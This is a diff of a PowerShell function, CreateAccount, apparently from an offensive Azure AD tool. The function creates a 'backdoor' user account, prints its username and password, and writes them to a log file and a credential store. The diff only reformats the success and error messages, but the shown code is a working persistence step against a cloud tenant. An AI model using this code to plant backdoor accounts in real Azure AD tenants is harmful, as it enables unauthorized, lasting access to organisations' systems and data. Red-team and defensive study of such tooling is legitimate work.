@@ -21,17 +21,16 @@ function CreateAccount {
         $PasswordProfile.ForceChangePasswordNextLogin = $false
         New-AzureADUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop | Out-File -FilePath .\Outputs\Backdoor_Account.txt -Append
         Start-Sleep -Seconds 10
-        Write-Host "Successfully created new backdoor account!!!" -ForegroundColor Yellow -BackgroundColor Black
+        Write-Host "`n[Success] Created new backdoor account" -ForegroundColor Yellow
 
         Write-Host "`nAccount Name: $new_backdoor_display_name `nUsername: $new_backdoor_username `nPassword: $new_backdoor_pass" 
-        Write-Host "`nDetails of backdoor account are logged in 'Backdoor_Account.txt'." -ForegroundColor Gray
+        Write-Host "`nDetails of backdoor account are logged in 'Backdoor_Account.txt'" -ForegroundColor Gray
         
         #Save to credential store
         AddCredentials "password" "CA_$new_backdoor_username-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $new_backdoor_username $new_backdoor_pass  
     }
     catch {
-        Write-Host "Error: Failed to create new backdoor account!" -ForegroundColor Red
-        #$_
+        Write-Host "`n[Error] Failed to create new backdoor account" -ForegroundColor Red
         break
     }
 }
